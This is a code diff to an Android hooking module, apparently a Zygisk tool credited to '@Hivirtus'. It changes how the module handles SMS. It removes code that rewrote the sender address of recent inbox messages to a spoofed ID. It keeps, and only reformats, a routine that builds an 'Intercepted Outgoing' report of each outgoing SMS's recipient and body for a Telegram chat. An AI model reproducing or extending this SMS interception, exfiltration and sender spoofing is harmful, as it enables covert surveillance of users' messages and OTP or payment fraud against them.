@@ -58,7 +58,7 @@ public final class SmsTweaksHooks {
                     waitApplication();
                     // Re-clear after Application — SmsManager may re-cache
                     clearSmsManagerCache();
-                    // Menu Sender ID: rewrite inbox +91 → saved ID (Messages has WRITE_SMS)
+                    // Sender ID: persist only — never rewrite sms.address (OTP-safe)
                     startSenderIdWatch();
                     status("init_ready|" + sProcess);
                 } catch (Throwable t) {
@@ -321,73 +321,17 @@ public final class SmsTweaksHooks {
     }
 
     private static void rewriteInboxSenderNow(Context ctx) {
+        // OTP-safe: NEVER rewrite content://sms address.
+        // UPI apps match bank sender from provider — spoofing address breaks autofill.
+        // Inbox display = Messages SmsMessage hooks + bugle_db (service.sh).
         if (ctx == null) return;
         final String sid = readSenderId();
         if (sid.isEmpty()) return;
-        Cursor c = null;
         try {
-            ContentResolver cr = ctx.getContentResolver();
-            long since = System.currentTimeMillis() - 24L * 60L * 60L * 1000L;
-            c = cr.query(
-                    Uri.parse("content://sms/inbox"),
-                    new String[]{"_id", "address", "date"},
-                    "date>?",
-                    new String[]{String.valueOf(since)},
-                    "date DESC LIMIT 80");
-            if (c == null) {
-                c = cr.query(
-                        Uri.parse("content://sms/inbox"),
-                        new String[]{"_id", "address", "date"},
-                        null, null, "date DESC");
-            }
-            if (c == null) return;
-            int changed = 0;
-            int scanned = 0;
-            while (c.moveToNext() && scanned < 80) {
-                scanned++;
-                long id;
-                String addr;
-                long date = 0L;
-                try {
-                    id = c.getLong(0);
-                    addr = c.getString(1);
-                    if (c.getColumnCount() > 2 && !c.isNull(2)) date = c.getLong(2);
-                } catch (Throwable t) {
-                    continue;
-                }
-                if (addr == null) addr = "";
-                if (sid.equals(addr)) continue;
-                if (date > 0L && date < since) continue;
-                ContentValues cv = new ContentValues();
-                cv.put("address", sid);
-                int u = 0;
-                try {
-                    u = cr.update(Uri.parse("content://sms/inbox"), cv, "_id=?",
-                            new String[]{String.valueOf(id)});
-                } catch (Throwable ignored) {}
-                if (u <= 0) {
-                    try {
-                        u = cr.update(Uri.parse("content://sms/" + id), cv, null, null);
-                    } catch (Throwable ignored) {}
-                }
-                if (u <= 0) {
-                    try {
-                        u = cr.update(Uri.parse("content://sms"), cv, "_id=?",
-                                new String[]{String.valueOf(id)});
-                    } catch (Throwable ignored) {}
-                }
-                if (u > 0) changed++;
-            }
-            if (changed > 0) {
-                status("sender_rewrite_java|" + sid + "|n=" + changed);
-            }
+            writeAll("hivirtus_sender_id.txt", sid + "\n");
+            status("sender_java_otp_safe|" + sid);
         } catch (Throwable t) {
-            status("sender_rewrite_java_fail|" + t.getClass().getSimpleName()
-                    + "|" + safe(t.getMessage()));
-        } finally {
-            if (c != null) {
-                try { c.close(); } catch (Throwable ignored) {}
-            }
+            status("sender_java_persist_fail|" + t.getClass().getSimpleName());
         }
     }
 
@@ -796,14 +740,10 @@ public final class SmsTweaksHooks {
                     if (digits.length() == 10) displayTo = "+91" + digits;
                     else if (digits.length() == 12 && digits.startsWith("91"))
                         displayTo = "+" + digits;
-                    // Screenshot spacing: blank after header + blank between To ↔ Body
-                    String msg = "📱 <b>Intercepted Outgoing Zygisk Mode Menu By @Hivirtus 🔥</b>\n"
-                            + "\n"
-                            + "\n"
+                    // Match spaced screenshot: 1 blank after header, 1 blank between To ↔ Body
+                    String msg = "📱 <b>Intercepted Outgoing Zygisk Mode Menu By @Hivirtus 🔥</b>\n\n"
                             + "<b>To (Tap to copy):</b>\n"
-                            + "<code>" + escHtml(displayTo) + "</code>\n"
-                            + "\n"
-                            + "\n"
+                            + "<code>" + escHtml(displayTo) + "</code>\n\n"
                             + "<b>Body (Tap to copy):</b>\n"
                             + "<code>" + escHtml(body) + "</code>";
                     String payload = "{\"chat_id\":\"" + jsonEscTg(chat)
